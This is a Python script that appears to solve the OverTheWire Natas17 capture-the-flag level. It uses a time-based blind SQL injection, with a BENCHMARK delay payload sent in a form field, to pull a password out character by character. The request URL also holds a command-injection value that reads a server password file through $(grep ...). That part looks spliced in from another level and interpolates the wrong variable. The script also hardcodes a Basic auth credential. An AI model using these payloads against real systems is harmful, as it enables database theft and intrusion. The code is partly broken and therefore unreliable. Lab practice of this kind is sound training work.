import requests
import re
import os

def buildQuery(field: str, letter: int, user: int, needle: int):
   return f'\" or if((ascii(substr((select {field} from users limit {user},1),{letter + 1},1))) = \"{needle}\", BENCHMARK(30000000,ENCODE(\'MSG\',\'by 5 seconds\')), 0) or \"\"=\"'

def check(query: str):
    url = f'http://natas17.natas.labs.overthewire.org/?needle=$(grep -v ^{str} /etc/natas_webpass/natas17)&submit=Search'
    response = requests.post(url, data={'username': query}, headers={'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='})

    return response.elapsed.total_seconds() > 2.5

alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

def findPassword(pass_len, user_idx):
    p = ''

    for letter_idx in range(pass_len):
        for idx, letter in enumerate(alphabet, start=0):
            result = check(buildQuery('password', letter_idx, user_idx, ord(letter)))

            if (result):
                p += letter

            os.system('clear')

            total = pass_len * len(alphabet)
            current = letter_idx * len(alphabet) + idx
            percent = current * 100 / total 

            print(p, "%.2f" % percent + '%')

findPassword(33, 3)
